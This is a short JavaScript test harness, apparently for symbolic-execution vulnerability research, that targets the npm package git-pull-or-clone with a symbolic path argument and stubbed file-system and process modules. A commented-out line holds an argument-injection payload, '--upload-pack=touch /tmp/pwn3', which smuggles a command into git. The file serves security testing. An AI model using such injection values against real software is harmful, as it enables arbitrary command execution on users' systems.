const esl = require("esl_symbolic");
require.cache["fs"] = {
  exports: {
    access: function (opath, flags, cb) {
      cb(true)
    }
  }
};
require.cache[require.resolve("cross-spawn")] = { exports: require("child_process").execFile };

const gitPullOrClone = require('git-pull-or-clone');
const repo = 'file:///tmp/zero12345'
// const path = '--upload-pack=touch /tmp/pwn3'
const path = esl.string("path");
// esl.assume(path.startsWith("--upload-pack="));
gitPullOrClone(repo, path, (err) => {
  if (err) throw err
  console.log('SUCCESS!')
})
